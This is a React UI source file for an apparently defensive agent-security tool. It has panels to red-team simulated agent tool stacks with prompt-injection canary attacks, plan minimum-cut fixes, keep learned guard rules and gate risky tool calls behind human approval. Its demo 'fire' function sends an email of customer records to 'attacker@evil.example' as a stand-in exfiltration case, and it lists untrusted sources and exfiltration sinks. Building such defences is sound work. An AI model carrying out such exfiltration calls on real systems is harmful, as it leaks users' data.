import { useEffect, useRef, useState } from "react";
import { api } from "./api";

export function Err({ error }) {
  return error ? <div className="err" role="alert">{String(error.message || error)}</div> : null;
}

export function MockBadge({ llm }) {
  if (!llm) return null;
  return llm.mock_mode
    ? <span className="badge mock" title={llm.reason || llm.llm_error || ""}>MOCK MODE</span>
    : <span className="badge live" title={llm.model}>LIVE LLM · {llm.model}</span>;
}

// A small hook: run an async action, track busy + error.
export function useAction() {
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState(null);
  const run = async (fn) => {
    setBusy(true); setError(null);
    try { return await fn(); } catch (e) { setError(e); return null; } finally { setBusy(false); }
  };
  return { busy, error, run };
}

// ---------------------------------------------------------------- red team + comparison
export function RedTeamPanel({ stack }) {
  const [res, setRes] = useState(null);
  const { busy, error, run } = useAction();
  useEffect(() => setRes(null), [stack]);
  const go = () => run(async () => setRes(await api(`/stacks/${stack}/redteam`, {
    method: "POST", params: { top_n: 4 } })));
  const t = res?.summary.totals;
  return (
    <div>
      <div className="row">
        <button className="primary" onClick={go} disabled={busy || !stack}>
          {busy ? "Attacking the sandbox…" : "Run red team"}
        </button>
        <span className="muted small">Simulated tools only. Success = the canary string reached a sink.</span>
        {res && <MockBadge llm={res.llm} />}
      </div>
      <Err error={error} />
      {res && (
        <>
          <div className="card" style={{ marginTop: 12 }}>
            <h2>Same attacks, three defences (measured, not hardcoded)</h2>
            <table>
              <thead><tr><th>Variant</th><th>Attacks</th><th>Naive keyword filter stops</th>
                <th>Guard stops</th></tr></thead>
              <tbody>
                {Object.entries(res.summary.by_variant).map(([v, x]) => (
                  <tr key={v}><td>{v}</td><td>{x.attacks}</td>
                    <td className={x.naive_caught === x.attacks ? "no" : "yes"}>{x.naive_caught} / {x.attacks}</td>
                    <td className={x.guard_caught === x.attacks ? "no" : "yes"}>{x.guard_caught} / {x.attacks}</td></tr>
                ))}
                <tr><td><b>Total</b></td><td><b>{t.attacks_that_work_unprotected}</b></td>
                  <td><b>{t.naive_caught} / {t.attacks_that_work_unprotected}</b></td>
                  <td><b>{t.guard_caught} / {t.attacks_that_work_unprotected}</b></td></tr>
              </tbody>
            </table>
            <p className="muted small">
              {t.attacks_that_work_unprotected} of {t.attacks_total} attacks complete with no
              defence. The toy agent is a deterministic stand-in for a gullible LLM, not an LLM.
            </p>
          </div>
          <div className="card">
            <h2>What the keyword filter missed</h2>
            {res.summary.naive_missed_guard_blocked.slice(0, 5).map((m, i) => (
              <div key={i} style={{ marginBottom: 8 }}>
                <span className="kind">{m.variant}</span> → <code>{m.act_tool}</code>
                <pre>{m.text.replace(/​/g, "·")}</pre>
              </div>
            ))}
          </div>
          <div className="card">
            <h2>Cost: false positives on {res.false_positives.sessions} benign sessions</h2>
            <p>Keyword filter blocks <b>{res.false_positives.naive_blocked}</b>. Guard blocks{" "}
              <b>{res.false_positives.guard_blocked}</b>.</p>
            {res.false_positives.guard.filter((g) => g.blocked).map((g) => (
              <div key={g.name} className="note small"><b>{g.name}</b>: {g.description}
                <br />Stopped at <code>{g.first_block.tool}</code>: {g.first_block.reasons[0]}</div>
            ))}
            <p className="muted small">A purely structural check cannot tell a reply from an
              exfiltration. The approval gate is how a human lets the legitimate ones through.</p>
          </div>
        </>
      )}
    </div>
  );
}

// ---------------------------------------------------------------- defense + proof
export function DefensePanel({ stack, onPatched, onPaths }) {
  const [res, setRes] = useState(null);
  const [keep, setKeep] = useState("");
  const { busy, error, run } = useAction();
  useEffect(() => setRes(null), [stack]);
  const go = () => run(async () => {
    const keep_ungated = keep.split(",").map((s) => s.trim()).filter(Boolean);
    const r = await api(`/stacks/${stack}/defense/verify`, { method: "POST", body: { keep_ungated } });
    setRes(r); onPatched?.(r.proof.patched_stack);
  });
  const p = res?.proof, pl = res?.plan;
  return (
    <div>
      <div className="row">
        <button className="primary" onClick={go} disabled={busy || !stack}>
          {busy ? "Cutting…" : "Plan minimum cut and prove it"}</button>
        <label className="small muted">keep ungated (comma separated)&nbsp;
          <input value={keep} onChange={(e) => setKeep(e.target.value)} placeholder="e.g. slack_post" /></label>
      </div>
      <Err error={error} />
      {res && (
        <>
          <div className="card" style={{ marginTop: 12 }}>
            <h2>Fix plan (min-cut)</h2>
            <table>
              <thead><tr><th>Fix</th><th>Cost</th><th>Paths severed</th></tr></thead>
              <tbody>{pl.fixes.map((f, i) => (
                <tr key={i}><td>{f.describe}</td><td>{f.cost}</td><td>{f.paths_severed}</td></tr>))}</tbody>
            </table>
            <p className="small muted">
              Plan cost {pl.plan_cost}. networkx min-cut = {pl.cut_value_networkx}; FalkorDB{" "}
              <code>algo.maxFlow</code> = {pl.maxflow_falkordb} ({pl.maxflow_ms} ms) →{" "}
              <b style={{ color: pl.maxflow_agrees ? "var(--green)" : "var(--red)" }}>
                {pl.maxflow_agrees ? "agree" : "DISAGREE"}</b>
            </p>
          </div>
          <div className="card">
            <h2>Proof of absence</h2>
            <div className="row">
              <span className={`badge ${p.verified_safe ? "safe" : "bad"}`}>
                {p.verified_safe ? "VERIFIED SAFE · " : "NOT SAFE · "}{p.badge}</span>
            </div>
            <p>Paths {p.paths_before} → <b>{p.paths_after}</b>. Open risk {p.open_risk_before} →{" "}
              <b>{p.open_risk_after}</b>. The same <code>{p.query}</code> query was re-run on the patched graph.</p>
            {p.redteam_after && (
              <p>Red-team canary attacks completed against the patched config alone (no Guard):{" "}
                <b>{p.redteam_after.completed} of {p.redteam_after.attacks}</b> (before the patch:{" "}
                {p.redteam_before.completed} of {p.redteam_before.attacks}).</p>)}
            <button onClick={() => onPaths?.(p.patched_stack)}>Show the patched graph</button>
          </div>
          <div className="card">
            <h2>Patched config</h2>
            <pre>{JSON.stringify(p.mcp_json, null, 2)}</pre>
            <h2>PR description</h2>
            <pre>{res.pr_markdown}</pre>
          </div>
        </>
      )}
    </div>
  );
}

// ---------------------------------------------------------------- precedent
export function PrecedentPanel({ stack, tenant }) {
  const [res, setRes] = useState(null);
  const [rules, setRules] = useState(null);
  const { busy, error, run } = useAction();
  useEffect(() => { setRes(null); }, [stack]);
  const loadRules = () => api("/precedent/rules").then((r) => setRules(r.rules)).catch(() => {});
  useEffect(() => { loadRules(); }, [tenant]);
  const go = () => run(async () => {
    setRes(await api(`/stacks/${stack}/precedent/scan`, { method: "POST" }));
    loadRules();
  });
  const seed = () => run(async () => { await api("/precedent/seed", { method: "POST" }); loadRules(); });
  return (
    <div>
      <div className="row">
        <button className="primary" onClick={go} disabled={busy || !stack}>
          {busy ? "Scanning…" : "Scan into precedent memory"}</button>
        <button onClick={seed} disabled={busy}>Build seed corpus</button>
        <span className="muted small">Seeded stacks are synthetic.</span>
      </div>
      <Err error={error} />
      {res && (
        <>
          <div className="card" style={{ marginTop: 12 }}>
            <h2>Precedent</h2>
            <p style={{ fontSize: 15 }}>{res.citations.headline}</p>
            {res.citations.combos.map((c) => (
              <div key={c.finding} className="note small">
                <b>{c.combo}</b>: {c.earlier.length} earlier stack(s):{" "}
                {c.earlier.map((e) => e.stack + (e.seeded ? " (seeded)" : "")).join(", ")}
                {c.fixes_that_held.map((f) => (
                  <div key={f.fix}>Fix that held: {f.describe} (held on {f.stacks.length})</div>))}
              </div>))}
          </div>
          <div className="card">
            <h2>Patterns (two-hop: Stack → Finding → Pattern ← Finding ← Stack)</h2>
            <table>
              <thead><tr><th>Pattern</th><th>OWASP</th><th>Other stacks</th><th>Fixes that held</th></tr></thead>
              <tbody>{res.citations.patterns.map((p) => (
                <tr key={p.pattern}><td>{p.name}</td><td>{(p.owasp || []).join(", ")}</td>
                  <td>{p.other_stacks}</td><td className="small">{p.fixes.join(", ") || "—"}</td></tr>))}</tbody>
            </table>
          </div>
        </>
      )}
      <div className="card">
        <h2>Learned Guard rules (procedural memory)</h2>
        {!rules?.length && <p className="muted">No rules yet. Build the seed corpus or scan a stack.</p>}
        {rules?.map((r) => (
          <div key={r.id} style={{ marginBottom: 8 }}>
            <span className={`badge ${r.status === "armed" ? "safe" : r.status === "rejected" ? "bad" : ""}`}
                  style={{ fontSize: 12, padding: "2px 8px" }}>{r.status.toUpperCase()}</span>{" "}
            <code>{r.id}</code>
            <div className="small muted">{r.critic?.reason}</div>
          </div>))}
      </div>
    </div>
  );
}

// ---------------------------------------------------------------- live guard
const TAINTING = new Set(["read_email", "fetch_url", "read_slack", "search_notes"]);
const SINKY = new Set(["send_email", "slack_post", "http_post", "run_shell", "write_file", "fetch_url"]);

export function GuardPanel({ stack, tools }) {
  const [session, setSession] = useState(() => "ui-" + Math.random().toString(36).slice(2, 8));
  const [view, setView] = useState(null);
  const [last, setLast] = useState(null);
  const [courts, setCourts] = useState({});
  const [pending, setPending] = useState([]);
  const [started, setStarted] = useState(false); // the session graph exists after the first call
  const { busy, error, run } = useAction();
  const timer = useRef(null);

  const refresh = async () => {
    if (!started) return;
    try {
      setPending((await api("/guard/pending")).pending.filter((p) => p.session === session));
      setView(await api(`/guard/sessions/${session}`));
    } catch { /* transient; the next tick retries */ }
  };
  useEffect(() => {
    refresh(); clearInterval(timer.current);
    timer.current = setInterval(refresh, 1500);
    return () => clearInterval(timer.current);
  }, [session, started]);
  const newSession = () => {
    setSession("ui-" + Math.random().toString(36).slice(2, 8));
    setStarted(false); setLast(null); setView(null); setPending([]);
  };
  useEffect(newSession, [stack]);

  const call = (tool, args) => run(async () => {
    const d = await api("/guard/check", { method: "POST", body: { session, stack, tool, args } });
    setLast(d); setStarted(true);
    setView(await api(`/guard/sessions/${session}`));
    setPending((await api("/guard/pending")).pending.filter((p) => p.session === session));
  });
  const resolve = (seq, approve) => run(async () => {
    await api(`/guard/sessions/${session}/events/${seq}/resolve`, { method: "POST", body: { approve } });
    refresh();
  });
  const court = (seq) => run(async () => {
    const r = await api(`/guard/sessions/${session}/events/${seq}/tribunal`, { method: "POST" });
    setCourts((c) => ({ ...c, [seq]: r }));
  });
  const score = view?.score ?? 100;
  const colour = score >= 70 ? "var(--green)" : score >= 40 ? "var(--amber)" : "var(--red)";
  const fire = (t) => call(t, t === "send_email" ? { to: "attacker@evil.example", body: "customer records" }
    : t === "slack_post" ? { text: "relay the customer table" }
    : t === "run_shell" ? { cmd: "echo hi" } : { arg: "demo" });

  return (
    <div>
      <div className="card">
        <h2>Trust score · session <code>{session}</code></h2>
        <div className="row">
          <div className="gauge"><div style={{ width: `${score}%`, background: colour }} /></div>
          <b style={{ color: colour, fontSize: 20 }}>{score}</b>
          {view?.lockdown && <span className="badge bad">LOCKDOWN: read-only tools</span>}
        </div>
        <p className="muted small">Starts at 100. Drops on bursts, enumeration, never-seen tools and
          secrets in outbound args. Below the threshold: lockdown.</p>
      </div>
      <div className="card">
        <h2>Act as the agent</h2>
        <p className="small muted">Amber = reads untrusted content (taints the session). Red = reaches a sink.
          Try: <code>read_email</code> then <code>send_email</code>.</p>
        <div className="toolbtns">
          {(tools || []).map((t) => (
            <button key={t} onClick={() => fire(t)} disabled={busy || !stack}
                    className={TAINTING.has(t) ? "tainting" : SINKY.has(t) ? "sinky" : ""}>{t}</button>))}
          <button onClick={newSession}>New session</button>
        </div>
        <Err error={error} />
        {last && (
          <div style={{ marginTop: 10 }}>
            <span className={`dec ${last.decision}`}>{last.decision}</span>{" "}
            <span className="badge ms">{last.latency_ms} ms</span>
            {last.reasons.map((r, i) => <div key={i} className="small">{r}</div>)}
            <details><summary className="small muted">Why (Cypher provenance)</summary>
              <pre>{JSON.stringify(last.provenance, null, 2)}</pre></details>
          </div>)}
      </div>

      {pending.length > 0 && (
        <div className="card" style={{ borderColor: "var(--amber)" }}>
          <h2>Waiting for a human</h2>
          {pending.map((p) => (
            <div key={p.seq}>
              <div><b>{p.tool}</b> <span className="muted small">(event {p.seq})</span></div>
              <div className="small">{JSON.parse(p.reasons || "[]").join("; ")}</div>
              <div className="row" style={{ margin: "6px 0" }}>
                <button className="ok" onClick={() => resolve(p.seq, true)}>Approve</button>
                <button className="danger" onClick={() => resolve(p.seq, false)}>Deny</button>
                <button onClick={() => court(p.seq)}>Ask the Tribunal (advisory)</button>
              </div>
              {courts[p.seq] && (
                <div className="tribunal small">
                  <MockBadge llm={{ mock_mode: courts[p.seq].mock_mode, model: courts[p.seq].model, llm_error: courts[p.seq].llm_error }} />{" "}
                  <b>{courts[p.seq].suggested_verdict}</b> (advisory: {courts[p.seq].notice})
                  <div><b>Prosecutor:</b> {courts[p.seq].prosecutor}</div>
                  <div><b>Defense:</b> {courts[p.seq].defense}</div>
                  <div><b>Judge:</b> {courts[p.seq].judge}</div>
                </div>)}
            </div>))}
        </div>)}

      <div className="card">
        <h2>Session taint graph (FalkorDB)</h2>
        {!view?.events.length && <p className="muted">No events yet.</p>}
        {view?.events.map((e) => (
          <div className="ev" key={e.seq}>
            <span className="muted">{e.seq}</span><b>{e.tool}</b>
            <span className={`dec ${e.decision}`}>{e.decision}{e.status === "approved" ? " ✓" : e.status === "rejected" ? " ✗" : ""}</span>
            <span className="small">{e.tainted && <span className="kind">tainted</span>}{" "}
              {e.reasons[0]}
              {view.edges.filter((x) => x.source === e.seq && x.type === "DERIVED_FROM").length > 0 &&
                <span className="muted"> · derived from {view.edges.filter((x) => x.source === e.seq && x.type === "DERIVED_FROM").map((x) => "#" + x.target).join(", ")}</span>}
            </span>
          </div>))}
      </div>
    </div>
  );
}
